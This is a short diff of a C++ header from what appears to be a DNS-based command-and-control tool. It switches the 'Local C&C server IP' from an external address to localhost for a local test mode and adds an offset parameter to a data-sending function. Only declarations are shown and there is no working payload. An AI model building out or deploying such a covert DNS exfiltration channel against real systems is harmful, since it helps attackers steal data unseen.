@@ -15,7 +15,7 @@ inline std::string TARGET_DOMAIN = "example.com";
 
 // LOCAL TEST MODE
 
-inline const char* DNS_SERVER_IP = "100.111.111.100";  // Local C&C server IP
+inline const char* DNS_SERVER_IP = "127.0.0.1";  // Local C&C server IP
 
 
 // ==========================================
@@ -23,5 +23,5 @@ inline const char* DNS_SERVER_IP = "100.111.111.100";  // Local C&C server IP
 // ==========================================
 int startConnection(const char* domain);
 int sendData(int& id, int& packetNumber, const char* domain, const char* data);
-int sendDataTypeC(int& id, int& packetNumber, const char* domain, const char* data);
+int sendDataTypeC(int& id, int& packetNumber, int& offset, const char* domain, const char* data);
 std::string convertToHex(const char* string);
